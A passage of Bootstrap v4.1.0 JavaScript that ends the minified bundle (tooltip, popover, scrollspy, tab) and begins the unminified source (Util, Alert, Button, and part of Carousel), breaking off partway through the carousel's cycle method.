this.constructor(t.currentTarget, this._getDelegateConfig()), oe(t.currentTarget).data(n, e)), t && (e._activeTrigger["focusin" === t.type ? Ae : Ie] = !0), oe(e.getTipElement()).hasClass(ye) || e._hoverState === me ? e._hoverState = me : (clearTimeout(e._timeout), e._hoverState = me, e.config.delay && e.config.delay.show ? e._timeout = setTimeout(function () { e._hoverState === me && e.show() }, e.config.delay.show) : e.show()) }, t._leave = function (t, e) { var n = this.constructor.DATA_KEY; (e = e || oe(t.currentTarget).data(n)) || (e = new this.constructor(t.currentTarget, this._getDelegateConfig()), oe(t.currentTarget).data(n, e)), t && (e._activeTrigger["focusout" === t.type ? Ae : Ie] = !1), e._isWithActiveTrigger() || (clearTimeout(e._timeout), e._hoverState = pe, e.config.delay && e.config.delay.hide ? e._timeout = setTimeout(function () { e._hoverState === pe && e.hide() }, e.config.delay.hide) : e.hide()) }, t._isWithActiveTrigger = function () { for (var t in this._activeTrigger) if (this._activeTrigger[t]) return !0; return !1 }, t._getConfig = function (t) { return "number" == typeof (t = h({}, this.constructor.Default, oe(this.element).data(), t)).delay && (t.delay = { show: t.delay, hide: t.delay }), "number" == typeof t.title && (t.title = t.title.toString()), "number" == typeof t.content && (t.content = t.content.toString()), Cn.typeCheckConfig(ae, t, this.constructor.DefaultType), t }, t._getDelegateConfig = function () { var t = {}; if (this.config) for (var e in this.config) this.constructor.Default[e] !== this.config[e] && (t[e] = this.config[e]); return t }, t._cleanTipClass = function () { var t = oe(this.getTipElement()), e = t.attr("class").match(fe); null !== e && 0 < e.length && t.removeClass(e.join("")) }, t._handlePopperPlacementChange = function (t) { this._cleanTipClass(), this.addAttachmentClass(this._getAttachment(t.placement)) }, t._fixTransition = function () { var t = this.getTipElement(), e = this.config.animation; null === t.getAttribute("x-placement") && (oe(t).removeClass(Ee), this.config.animation = !1, this.hide(), this.show(), this.config.animation = e) }, i._jQueryInterface = function (n) { return this.each(function () { var t = oe(this).data(le), e = "object" == typeof n && n; if ((t || !/dispose|hide/.test(n)) && (t || (t = new i(this, e), oe(this).data(le, t)), "string" == typeof n)) { if ("undefined" == typeof t[n]) throw new TypeError('No method named "' + n + '"'); t[n]() } }) }, o(i, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return ge } }, { key: "NAME", get: function () { return ae } }, { key: "DATA_KEY", get: function () { return le } }, { key: "Event", get: function () { return ve } }, { key: "EVENT_KEY", get: function () { return he } }, { key: "DefaultType", get: function () { return de } }]), i }(), oe.fn[ae] = Se._jQueryInterface, oe.fn[ae].Constructor = Se, oe.fn[ae].noConflict = function () { return oe.fn[ae] = ce, Se._jQueryInterface }, Se), On = (Ne = "popover", ke = "." + (Oe = "bs.popover"), Pe = (we = e).fn[Ne], Le = "bs-popover", je = new RegExp("(^|\\s)" + Le + "\\S+", "g"), Re = h({}, Nn.Default, { placement: "right", trigger: "click", content: "", template: '<div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>' }), He = h({}, Nn.DefaultType, { content: "(string|element|function)" }), We = "fade", xe = ".popover-header", Ue = ".popover-body", Ke = { HIDE: "hide" + ke, HIDDEN: "hidden" + ke, SHOW: (Me = "show") + ke, SHOWN: "shown" + ke, INSERTED: "inserted" + ke, CLICK: "click" + ke, FOCUSIN: "focusin" + ke, FOCUSOUT: "focusout" + ke, MOUSEENTER: "mouseenter" + ke, MOUSELEAVE: "mouseleave" + ke }, Fe = function (t) { var e, n; function i() { return t.apply(this, arguments) || this } n = t, (e = i).prototype = Object.create(n.prototype), (e.prototype.constructor = e).__proto__ = n; var r = i.prototype; return r.isWithContent = function () { return this.getTitle() || this._getContent() }, r.addAttachmentClass = function (t) { we(this.getTipElement()).addClass(Le + "-" + t) }, r.getTipElement = function () { return this.tip = this.tip || we(this.config.template)[0], this.tip }, r.setContent = function () { var t = we(this.getTipElement()); this.setElementContent(t.find(xe), this.getTitle()); var e = this._getContent(); "function" == typeof e && (e = e.call(this.element)), this.setElementContent(t.find(Ue), e), t.removeClass(We + " " + Me) }, r._getContent = function () { return this.element.getAttribute("data-content") || this.config.content }, r._cleanTipClass = function () { var t = we(this.getTipElement()), e = t.attr("class").match(je); null !== e && 0 < e.length && t.removeClass(e.join("")) }, i._jQueryInterface = function (n) { return this.each(function () { var t = we(this).data(Oe), e = "object" == typeof n ? n : null; if ((t || !/destroy|hide/.test(n)) && (t || (t = new i(this, e), we(this).data(Oe, t)), "string" == typeof n)) { if ("undefined" == typeof t[n]) throw new TypeError('No method named "' + n + '"'); t[n]() } }) }, o(i, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return Re } }, { key: "NAME", get: function () { return Ne } }, { key: "DATA_KEY", get: function () { return Oe } }, { key: "Event", get: function () { return Ke } }, { key: "EVENT_KEY", get: function () { return ke } }, { key: "DefaultType", get: function () { return He } }]), i }(Nn), we.fn[Ne] = Fe._jQueryInterface, we.fn[Ne].Constructor = Fe, we.fn[Ne].noConflict = function () { return we.fn[Ne] = Pe, Fe._jQueryInterface }, Fe), kn = (Qe = "scrollspy", Ye = "." + (Be = "bs.scrollspy"), Ge = (Ve = e).fn[Qe], qe = { offset: 10, method: "auto", target: "" }, ze = { offset: "number", method: "string", target: "(string|element)" }, Xe = { ACTIVATE: "activate" + Ye, SCROLL: "scroll" + Ye, LOAD_DATA_API: "load" + Ye + ".data-api" }, Je = "dropdown-item", Ze = "active", $e = { DATA_SPY: '[data-spy="scroll"]', ACTIVE: ".active", NAV_LIST_GROUP: ".nav, .list-group", NAV_LINKS: ".nav-link", NAV_ITEMS: ".nav-item", LIST_ITEMS: ".list-group-item", DROPDOWN: ".dropdown", DROPDOWN_ITEMS: ".dropdown-item", DROPDOWN_TOGGLE: ".dropdown-toggle" }, tn = "offset", en = "position", nn = function () { function n(t, e) { var n = this; this._element = t, this._scrollElement = "BODY" === t.tagName ? window : t, this._config = this._getConfig(e), this._selector = this._config.target + " " + $e.NAV_LINKS + "," + this._config.target + " " + $e.LIST_ITEMS + "," + this._config.target + " " + $e.DROPDOWN_ITEMS, this._offsets = [], this._targets = [], this._activeTarget = null, this._scrollHeight = 0, Ve(this._scrollElement).on(Xe.SCROLL, function (t) { return n._process(t) }), this.refresh(), this._process() } var t = n.prototype; return t.refresh = function () { var e = this, t = this._scrollElement === this._scrollElement.window ? tn : en, r = "auto" === this._config.method ? t : this._config.method, s = r === en ? this._getScrollTop() : 0; this._offsets = [], this._targets = [], this._scrollHeight = this._getScrollHeight(), Ve.makeArray(Ve(this._selector)).map(function (t) { var e, n = Cn.getSelectorFromElement(t); if (n && (e = Ve(n)[0]), e) { var i = e.getBoundingClientRect(); if (i.width || i.height) return [Ve(e)[r]().top + s, n] } return null }).filter(function (t) { return t }).sort(function (t, e) { return t[0] - e[0] }).forEach(function (t) { e._offsets.push(t[0]), e._targets.push(t[1]) }) }, t.dispose = function () { Ve.removeData(this._element, Be), Ve(this._scrollElement).off(Ye), this._element = null, this._scrollElement = null, this._config = null, this._selector = null, this._offsets = null, this._targets = null, this._activeTarget = null, this._scrollHeight = null }, t._getConfig = function (t) { if ("string" != typeof (t = h({}, qe, t)).target) { var e = Ve(t.target).attr("id"); e || (e = Cn.getUID(Qe), Ve(t.target).attr("id", e)), t.target = "#" + e } return Cn.typeCheckConfig(Qe, t, ze), t }, t._getScrollTop = function () { return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop }, t._getScrollHeight = function () { return this._scrollElement.scrollHeight || Math.max(document.body.scrollHeight, document.documentElement.scrollHeight) }, t._getOffsetHeight = function () { return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height }, t._process = function () { var t = this._getScrollTop() + this._config.offset, e = this._getScrollHeight(), n = this._config.offset + e - this._getOffsetHeight(); if (this._scrollHeight !== e && this.refresh(), n <= t) { var i = this._targets[this._targets.length - 1]; this._activeTarget !== i && this._activate(i) } else { if (this._activeTarget && t < this._offsets[0] && 0 < this._offsets[0]) return this._activeTarget = null, void this._clear(); for (var r = this._offsets.length; r--;) { this._activeTarget !== this._targets[r] && t >= this._offsets[r] && ("undefined" == typeof this._offsets[r + 1] || t < this._offsets[r + 1]) && this._activate(this._targets[r]) } } }, t._activate = function (e) { this._activeTarget = e, this._clear(); var t = this._selector.split(","); t = t.map(function (t) { return t + '[data-target="' + e + '"],' + t + '[href="' + e + '"]' }); var n = Ve(t.join(",")); n.hasClass(Je) ? (n.closest($e.DROPDOWN).find($e.DROPDOWN_TOGGLE).addClass(Ze), n.addClass(Ze)) : (n.addClass(Ze), n.parents($e.NAV_LIST_GROUP).prev($e.NAV_LINKS + ", " + $e.LIST_ITEMS).addClass(Ze), n.parents($e.NAV_LIST_GROUP).prev($e.NAV_ITEMS).children($e.NAV_LINKS).addClass(Ze)), Ve(this._scrollElement).trigger(Xe.ACTIVATE, { relatedTarget: e }) }, t._clear = function () { Ve(this._selector).filter($e.ACTIVE).removeClass(Ze) }, n._jQueryInterface = function (e) { return this.each(function () { var t = Ve(this).data(Be); if (t || (t = new n(this, "object" == typeof e && e), Ve(this).data(Be, t)), "string" == typeof e) { if ("undefined" == typeof t[e]) throw new TypeError('No method named "' + e + '"'); t[e]() } }) }, o(n, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return qe } }]), n }(), Ve(window).on(Xe.LOAD_DATA_API, function () { for (var t = Ve.makeArray(Ve($e.DATA_SPY)), e = t.length; e--;) { var n = Ve(t[e]); nn._jQueryInterface.call(n, n.data()) } }), Ve.fn[Qe] = nn._jQueryInterface, Ve.fn[Qe].Constructor = nn, Ve.fn[Qe].noConflict = function () { return Ve.fn[Qe] = Ge, nn._jQueryInterface }, nn), Pn = (on = "." + (sn = "bs.tab"), an = (rn = e).fn.tab, ln = { HIDE: "hide" + on, HIDDEN: "hidden" + on, SHOW: "show" + on, SHOWN: "shown" + on, CLICK_DATA_API: "click" + on + ".data-api" }, hn = "dropdown-menu", cn = "active", un = "disabled", fn = "fade", dn = "show", _n = ".dropdown", gn = ".nav, .list-group", mn = ".active", pn = "> li > .active", vn = '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]', En = ".dropdown-toggle", yn = "> .dropdown-menu .active", Tn = function () { function i(t) { this._element = t } var t = i.prototype; return t.show = function () { var n = this; if (!(this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && rn(this._element).hasClass(cn) || rn(this._element).hasClass(un))) { var t, i, e = rn(this._element).closest(gn)[0], r = Cn.getSelectorFromElement(this._element); if (e) { var s = "UL" === e.nodeName ? pn : mn; i = (i = rn.makeArray(rn(e).find(s)))[i.length - 1] } var o = rn.Event(ln.HIDE, { relatedTarget: this._element }), a = rn.Event(ln.SHOW, { relatedTarget: i }); if (i && rn(i).trigger(o), rn(this._element).trigger(a), !a.isDefaultPrevented() && !o.isDefaultPrevented()) { r && (t = rn(r)[0]), this._activate(this._element, e); var l = function () { var t = rn.Event(ln.HIDDEN, { relatedTarget: n._element }), e = rn.Event(ln.SHOWN, { relatedTarget: i }); rn(i).trigger(t), rn(n._element).trigger(e) }; t ? this._activate(t, t.parentNode, l) : l() } } }, t.dispose = function () { rn.removeData(this._element, sn), this._element = null }, t._activate = function (t, e, n) { var i = this, r = ("UL" === e.nodeName ? rn(e).find(pn) : rn(e).children(mn))[0], s = n && r && rn(r).hasClass(fn), o = function () { return i._transitionComplete(t, r, n) }; if (r && s) { var a = Cn.getTransitionDurationFromElement(r); rn(r).one(Cn.TRANSITION_END, o).emulateTransitionEnd(a) } else o() }, t._transitionComplete = function (t, e, n) { if (e) { rn(e).removeClass(dn + " " + cn); var i = rn(e.parentNode).find(yn)[0]; i && rn(i).removeClass(cn), "tab" === e.getAttribute("role") && e.setAttribute("aria-selected", !1) } if (rn(t).addClass(cn), "tab" === t.getAttribute("role") && t.setAttribute("aria-selected", !0), Cn.reflow(t), rn(t).addClass(dn), t.parentNode && rn(t.parentNode).hasClass(hn)) { var r = rn(t).closest(_n)[0]; r && rn(r).find(En).addClass(cn), t.setAttribute("aria-expanded", !0) } n && n() }, i._jQueryInterface = function (n) { return this.each(function () { var t = rn(this), e = t.data(sn); if (e || (e = new i(this), t.data(sn, e)), "string" == typeof n) { if ("undefined" == typeof e[n]) throw new TypeError('No method named "' + n + '"'); e[n]() } }) }, o(i, null, [{ key: "VERSION", get: function () { return "4.1.0" } }]), i }(), rn(document).on(ln.CLICK_DATA_API, vn, function (t) { t.preventDefault(), Tn._jQueryInterface.call(rn(this), "show") }), rn.fn.tab = Tn._jQueryInterface, rn.fn.tab.Constructor = Tn, rn.fn.tab.noConflict = function () { return rn.fn.tab = an, Tn._jQueryInterface }, Tn); !function (t) { if ("undefined" == typeof t) throw new TypeError("Bootstrap's JavaScript requires jQuery. jQuery must be included before Bootstrap's JavaScript."); var e = t.fn.jquery.split(" ")[0].split("."); if (e[0] < 2 && e[1] < 9 || 1 === e[0] && 9 === e[1] && e[2] < 1 || 4 <= e[0]) throw new Error("Bootstrap's JavaScript requires at least jQuery v1.9.1 but less than v4.0.0") }(e), t.Util = Cn, t.Alert = In, t.Button = An, t.Carousel = Dn, t.Collapse = bn, t.Dropdown = Sn, t.Modal = wn, t.Popover = On, t.Scrollspy = kn, t.Tab = Pn, t.Tooltip = Nn, Object.defineProperty(t, "__esModule", { value: !0 }) });
//# sourceMappingURL=bootstrap.min.js.map



/*!
  * Bootstrap v4.1.0 (https://getbootstrap.com/)
  * Copyright 2011-2018 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
  */
(function (global, factory) {
  typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports, require('jquery'), require('popper.js')) :
    typeof define === 'function' && define.amd ? define(['exports', 'jquery', 'popper.js'], factory) :
      (factory((global.bootstrap = {}), global.jQuery, global.Popper));
}(this, (function (exports, $, Popper) {
  'use strict';

  $ = $ && $.hasOwnProperty('default') ? $['default'] : $;
  Popper = Popper && Popper.hasOwnProperty('default') ? Popper['default'] : Popper;

  function _defineProperties(target, props) {
    for (var i = 0; i < props.length; i++) {
      var descriptor = props[i];
      descriptor.enumerable = descriptor.enumerable || false;
      descriptor.configurable = true;
      if ("value" in descriptor) descriptor.writable = true;
      Object.defineProperty(target, descriptor.key, descriptor);
    }
  }

  function _createClass(Constructor, protoProps, staticProps) {
    if (protoProps) _defineProperties(Constructor.prototype, protoProps);
    if (staticProps) _defineProperties(Constructor, staticProps);
    return Constructor;
  }

  function _defineProperty(obj, key, value) {
    if (key in obj) {
      Object.defineProperty(obj, key, {
        value: value,
        enumerable: true,
        configurable: true,
        writable: true
      });
    } else {
      obj[key] = value;
    }

    return obj;
  }

  function _objectSpread(target) {
    for (var i = 1; i < arguments.length; i++) {
      var source = arguments[i] != null ? arguments[i] : {};
      var ownKeys = Object.keys(source);

      if (typeof Object.getOwnPropertySymbols === 'function') {
        ownKeys = ownKeys.concat(Object.getOwnPropertySymbols(source).filter(function (sym) {
          return Object.getOwnPropertyDescriptor(source, sym).enumerable;
        }));
      }

      ownKeys.forEach(function (key) {
        _defineProperty(target, key, source[key]);
      });
    }

    return target;
  }

  function _inheritsLoose(subClass, superClass) {
    subClass.prototype = Object.create(superClass.prototype);
    subClass.prototype.constructor = subClass;
    subClass.__proto__ = superClass;
  }

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.1.0): util.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  var Util = function ($$$1) {
    /**
     * ------------------------------------------------------------------------
     * Private TransitionEnd Helpers
     * ------------------------------------------------------------------------
     */
    var TRANSITION_END = 'transitionend';
    var MAX_UID = 1000000;
    var MILLISECONDS_MULTIPLIER = 1000; // Shoutout AngusCroll (https://goo.gl/pxwQGp)

    function toType(obj) {
      return {}.toString.call(obj).match(/\s([a-z]+)/i)[1].toLowerCase();
    }

    function getSpecialTransitionEndEvent() {
      return {
        bindType: TRANSITION_END,
        delegateType: TRANSITION_END,
        handle: function handle(event) {
          if ($$$1(event.target).is(this)) {
            return event.handleObj.handler.apply(this, arguments); // eslint-disable-line prefer-rest-params
          }

          return undefined; // eslint-disable-line no-undefined
        }
      };
    }

    function transitionEndEmulator(duration) {
      var _this = this;

      var called = false;
      $$$1(this).one(Util.TRANSITION_END, function () {
        called = true;
      });
      setTimeout(function () {
        if (!called) {
          Util.triggerTransitionEnd(_this);
        }
      }, duration);
      return this;
    }

    function setTransitionEndSupport() {
      $$$1.fn.emulateTransitionEnd = transitionEndEmulator;
      $$$1.event.special[Util.TRANSITION_END] = getSpecialTransitionEndEvent();
    }
    /**
     * --------------------------------------------------------------------------
     * Public Util Api
     * --------------------------------------------------------------------------
     */


    var Util = {
      TRANSITION_END: 'bsTransitionEnd',
      getUID: function getUID(prefix) {
        do {
          // eslint-disable-next-line no-bitwise
          prefix += ~~(Math.random() * MAX_UID); // "~~" acts like a faster Math.floor() here
        } while (document.getElementById(prefix));

        return prefix;
      },
      getSelectorFromElement: function getSelectorFromElement(element) {
        var selector = element.getAttribute('data-target');

        if (!selector || selector === '#') {
          selector = element.getAttribute('href') || '';
        }

        try {
          var $selector = $$$1(document).find(selector);
          return $selector.length > 0 ? selector : null;
        } catch (err) {
          return null;
        }
      },
      getTransitionDurationFromElement: function getTransitionDurationFromElement(element) {
        if (!element) {
          return 0;
        } // Get transition-duration of the element


        var transitionDuration = $$$1(element).css('transition-duration');
        var floatTransitionDuration = parseFloat(transitionDuration); // Return 0 if element or transition duration is not found

        if (!floatTransitionDuration) {
          return 0;
        } // If multiple durations are defined, take the first


        transitionDuration = transitionDuration.split(',')[0];
        return parseFloat(transitionDuration) * MILLISECONDS_MULTIPLIER;
      },
      reflow: function reflow(element) {
        return element.offsetHeight;
      },
      triggerTransitionEnd: function triggerTransitionEnd(element) {
        $$$1(element).trigger(TRANSITION_END);
      },
      // TODO: Remove in v5
      supportsTransitionEnd: function supportsTransitionEnd() {
        return Boolean(TRANSITION_END);
      },
      isElement: function isElement(obj) {
        return (obj[0] || obj).nodeType;
      },
      typeCheckConfig: function typeCheckConfig(componentName, config, configTypes) {
        for (var property in configTypes) {
          if (Object.prototype.hasOwnProperty.call(configTypes, property)) {
            var expectedTypes = configTypes[property];
            var value = config[property];
            var valueType = value && Util.isElement(value) ? 'element' : toType(value);

            if (!new RegExp(expectedTypes).test(valueType)) {
              throw new Error(componentName.toUpperCase() + ": " + ("Option \"" + property + "\" provided type \"" + valueType + "\" ") + ("but expected type \"" + expectedTypes + "\"."));
            }
          }
        }
      }
    };
    setTransitionEndSupport();
    return Util;
  }($);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.1.0): alert.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  var Alert = function ($$$1) {
    /**
     * ------------------------------------------------------------------------
     * Constants
     * ------------------------------------------------------------------------
     */
    var NAME = 'alert';
    var VERSION = '4.1.0';
    var DATA_KEY = 'bs.alert';
    var EVENT_KEY = "." + DATA_KEY;
    var DATA_API_KEY = '.data-api';
    var JQUERY_NO_CONFLICT = $$$1.fn[NAME];
    var Selector = {
      DISMISS: '[data-dismiss="alert"]'
    };
    var Event = {
      CLOSE: "close" + EVENT_KEY,
      CLOSED: "closed" + EVENT_KEY,
      CLICK_DATA_API: "click" + EVENT_KEY + DATA_API_KEY
    };
    var ClassName = {
      ALERT: 'alert',
      FADE: 'fade',
      SHOW: 'show'
      /**
       * ------------------------------------------------------------------------
       * Class Definition
       * ------------------------------------------------------------------------
       */

    };

    var Alert =
      /*#__PURE__*/
      function () {
        function Alert(element) {
          this._element = element;
        } // Getters


        var _proto = Alert.prototype;

        // Public
        _proto.close = function close(element) {
          element = element || this._element;

          var rootElement = this._getRootElement(element);

          var customEvent = this._triggerCloseEvent(rootElement);

          if (customEvent.isDefaultPrevented()) {
            return;
          }

          this._removeElement(rootElement);
        };

        _proto.dispose = function dispose() {
          $$$1.removeData(this._element, DATA_KEY);
          this._element = null;
        }; // Private


        _proto._getRootElement = function _getRootElement(element) {
          var selector = Util.getSelectorFromElement(element);
          var parent = false;

          if (selector) {
            parent = $$$1(selector)[0];
          }

          if (!parent) {
            parent = $$$1(element).closest("." + ClassName.ALERT)[0];
          }

          return parent;
        };

        _proto._triggerCloseEvent = function _triggerCloseEvent(element) {
          var closeEvent = $$$1.Event(Event.CLOSE);
          $$$1(element).trigger(closeEvent);
          return closeEvent;
        };

        _proto._removeElement = function _removeElement(element) {
          var _this = this;

          $$$1(element).removeClass(ClassName.SHOW);

          if (!$$$1(element).hasClass(ClassName.FADE)) {
            this._destroyElement(element);

            return;
          }

          var transitionDuration = Util.getTransitionDurationFromElement(element);
          $$$1(element).one(Util.TRANSITION_END, function (event) {
            return _this._destroyElement(element, event);
          }).emulateTransitionEnd(transitionDuration);
        };

        _proto._destroyElement = function _destroyElement(element) {
          $$$1(element).detach().trigger(Event.CLOSED).remove();
        }; // Static


        Alert._jQueryInterface = function _jQueryInterface(config) {
          return this.each(function () {
            var $element = $$$1(this);
            var data = $element.data(DATA_KEY);

            if (!data) {
              data = new Alert(this);
              $element.data(DATA_KEY, data);
            }

            if (config === 'close') {
              data[config](this);
            }
          });
        };

        Alert._handleDismiss = function _handleDismiss(alertInstance) {
          return function (event) {
            if (event) {
              event.preventDefault();
            }

            alertInstance.close(this);
          };
        };

        _createClass(Alert, null, [{
          key: "VERSION",
          get: function get() {
            return VERSION;
          }
        }]);

        return Alert;
      }();
    /**
     * ------------------------------------------------------------------------
     * Data Api implementation
     * ------------------------------------------------------------------------
     */


    $$$1(document).on(Event.CLICK_DATA_API, Selector.DISMISS, Alert._handleDismiss(new Alert()));
    /**
     * ------------------------------------------------------------------------
     * jQuery
     * ------------------------------------------------------------------------
     */

    $$$1.fn[NAME] = Alert._jQueryInterface;
    $$$1.fn[NAME].Constructor = Alert;

    $$$1.fn[NAME].noConflict = function () {
      $$$1.fn[NAME] = JQUERY_NO_CONFLICT;
      return Alert._jQueryInterface;
    };

    return Alert;
  }($);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.1.0): button.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  var Button = function ($$$1) {
    /**
     * ------------------------------------------------------------------------
     * Constants
     * ------------------------------------------------------------------------
     */
    var NAME = 'button';
    var VERSION = '4.1.0';
    var DATA_KEY = 'bs.button';
    var EVENT_KEY = "." + DATA_KEY;
    var DATA_API_KEY = '.data-api';
    var JQUERY_NO_CONFLICT = $$$1.fn[NAME];
    var ClassName = {
      ACTIVE: 'active',
      BUTTON: 'btn',
      FOCUS: 'focus'
    };
    var Selector = {
      DATA_TOGGLE_CARROT: '[data-toggle^="button"]',
      DATA_TOGGLE: '[data-toggle="buttons"]',
      INPUT: 'input',
      ACTIVE: '.active',
      BUTTON: '.btn'
    };
    var Event = {
      CLICK_DATA_API: "click" + EVENT_KEY + DATA_API_KEY,
      FOCUS_BLUR_DATA_API: "focus" + EVENT_KEY + DATA_API_KEY + " " + ("blur" + EVENT_KEY + DATA_API_KEY)
      /**
       * ------------------------------------------------------------------------
       * Class Definition
       * ------------------------------------------------------------------------
       */

    };

    var Button =
      /*#__PURE__*/
      function () {
        function Button(element) {
          this._element = element;
        } // Getters


        var _proto = Button.prototype;

        // Public
        _proto.toggle = function toggle() {
          var triggerChangeEvent = true;
          var addAriaPressed = true;
          var rootElement = $$$1(this._element).closest(Selector.DATA_TOGGLE)[0];

          if (rootElement) {
            var input = $$$1(this._element).find(Selector.INPUT)[0];

            if (input) {
              if (input.type === 'radio') {
                if (input.checked && $$$1(this._element).hasClass(ClassName.ACTIVE)) {
                  triggerChangeEvent = false;
                } else {
                  var activeElement = $$$1(rootElement).find(Selector.ACTIVE)[0];

                  if (activeElement) {
                    $$$1(activeElement).removeClass(ClassName.ACTIVE);
                  }
                }
              }

              if (triggerChangeEvent) {
                if (input.hasAttribute('disabled') || rootElement.hasAttribute('disabled') || input.classList.contains('disabled') || rootElement.classList.contains('disabled')) {
                  return;
                }

                input.checked = !$$$1(this._element).hasClass(ClassName.ACTIVE);
                $$$1(input).trigger('change');
              }

              input.focus();
              addAriaPressed = false;
            }
          }

          if (addAriaPressed) {
            this._element.setAttribute('aria-pressed', !$$$1(this._element).hasClass(ClassName.ACTIVE));
          }

          if (triggerChangeEvent) {
            $$$1(this._element).toggleClass(ClassName.ACTIVE);
          }
        };

        _proto.dispose = function dispose() {
          $$$1.removeData(this._element, DATA_KEY);
          this._element = null;
        }; // Static


        Button._jQueryInterface = function _jQueryInterface(config) {
          return this.each(function () {
            var data = $$$1(this).data(DATA_KEY);

            if (!data) {
              data = new Button(this);
              $$$1(this).data(DATA_KEY, data);
            }

            if (config === 'toggle') {
              data[config]();
            }
          });
        };

        _createClass(Button, null, [{
          key: "VERSION",
          get: function get() {
            return VERSION;
          }
        }]);

        return Button;
      }();
    /**
     * ------------------------------------------------------------------------
     * Data Api implementation
     * ------------------------------------------------------------------------
     */


    $$$1(document).on(Event.CLICK_DATA_API, Selector.DATA_TOGGLE_CARROT, function (event) {
      event.preventDefault();
      var button = event.target;

      if (!$$$1(button).hasClass(ClassName.BUTTON)) {
        button = $$$1(button).closest(Selector.BUTTON);
      }

      Button._jQueryInterface.call($$$1(button), 'toggle');
    }).on(Event.FOCUS_BLUR_DATA_API, Selector.DATA_TOGGLE_CARROT, function (event) {
      var button = $$$1(event.target).closest(Selector.BUTTON)[0];
      $$$1(button).toggleClass(ClassName.FOCUS, /^focus(in)?$/.test(event.type));
    });
    /**
     * ------------------------------------------------------------------------
     * jQuery
     * ------------------------------------------------------------------------
     */

    $$$1.fn[NAME] = Button._jQueryInterface;
    $$$1.fn[NAME].Constructor = Button;

    $$$1.fn[NAME].noConflict = function () {
      $$$1.fn[NAME] = JQUERY_NO_CONFLICT;
      return Button._jQueryInterface;
    };

    return Button;
  }($);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.1.0): carousel.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  var Carousel = function ($$$1) {
    /**
     * ------------------------------------------------------------------------
     * Constants
     * ------------------------------------------------------------------------
     */
    var NAME = 'carousel';
    var VERSION = '4.1.0';
    var DATA_KEY = 'bs.carousel';
    var EVENT_KEY = "." + DATA_KEY;
    var DATA_API_KEY = '.data-api';
    var JQUERY_NO_CONFLICT = $$$1.fn[NAME];
    var ARROW_LEFT_KEYCODE = 37; // KeyboardEvent.which value for left arrow key

    var ARROW_RIGHT_KEYCODE = 39; // KeyboardEvent.which value for right arrow key

    var TOUCHEVENT_COMPAT_WAIT = 500; // Time for mouse compat events to fire after touch

    var Default = {
      interval: 5000,
      keyboard: true,
      slide: false,
      pause: 'hover',
      wrap: true
    };
    var DefaultType = {
      interval: '(number|boolean)',
      keyboard: 'boolean',
      slide: '(boolean|string)',
      pause: '(string|boolean)',
      wrap: 'boolean'
    };
    var Direction = {
      NEXT: 'next',
      PREV: 'prev',
      LEFT: 'left',
      RIGHT: 'right'
    };
    var Event = {
      SLIDE: "slide" + EVENT_KEY,
      SLID: "slid" + EVENT_KEY,
      KEYDOWN: "keydown" + EVENT_KEY,
      MOUSEENTER: "mouseenter" + EVENT_KEY,
      MOUSELEAVE: "mouseleave" + EVENT_KEY,
      TOUCHEND: "touchend" + EVENT_KEY,
      LOAD_DATA_API: "load" + EVENT_KEY + DATA_API_KEY,
      CLICK_DATA_API: "click" + EVENT_KEY + DATA_API_KEY
    };
    var ClassName = {
      CAROUSEL: 'carousel',
      ACTIVE: 'active',
      SLIDE: 'slide',
      RIGHT: 'carousel-item-right',
      LEFT: 'carousel-item-left',
      NEXT: 'carousel-item-next',
      PREV: 'carousel-item-prev',
      ITEM: 'carousel-item'
    };
    var Selector = {
      ACTIVE: '.active',
      ACTIVE_ITEM: '.active.carousel-item',
      ITEM: '.carousel-item',
      NEXT_PREV: '.carousel-item-next, .carousel-item-prev',
      INDICATORS: '.carousel-indicators',
      DATA_SLIDE: '[data-slide], [data-slide-to]',
      DATA_RIDE: '[data-ride="carousel"]'
      /**
       * ------------------------------------------------------------------------
       * Class Definition
       * ------------------------------------------------------------------------
       */

    };

    var Carousel =
      /*#__PURE__*/
      function () {
        function Carousel(element, config) {
          this._items = null;
          this._interval = null;
          this._activeElement = null;
          this._isPaused = false;
          this._isSliding = false;
          this.touchTimeout = null;
          this._config = this._getConfig(config);
          this._element = $$$1(element)[0];
          this._indicatorsElement = $$$1(this._element).find(Selector.INDICATORS)[0];

          this._addEventListeners();
        } // Getters


        var _proto = Carousel.prototype;

        // Public
        _proto.next = function next() {
          if (!this._isSliding) {
            this._slide(Direction.NEXT);
          }
        };

        _proto.nextWhenVisible = function nextWhenVisible() {
          // Don't call next when the page isn't visible
          // or the carousel or its parent isn't visible
          if (!document.hidden && $$$1(this._element).is(':visible') && $$$1(this._element).css('visibility') !== 'hidden') {
            this.next();
          }
        };

        _proto.prev = function prev() {
          if (!this._isSliding) {
            this._slide(Direction.PREV);
          }
        };

        _proto.pause = function pause(event) {
          if (!event) {
            this._isPaused = true;
          }

          if ($$$1(this._element).find(Selector.NEXT_PREV)[0]) {
            Util.triggerTransitionEnd(this._element);
            this.cycle(true);
          }

          clearInterval(this._interval);
          this._interval = null;
        };

        _proto.cycle = function cycle(event) {
          if (!event) {
            this._isPaused = false;
          }

          if (this._interval) {
            clearInterval(this._interval);
            this._interval = null;
          }

          if (this._config.interval && !this._isPaused) {
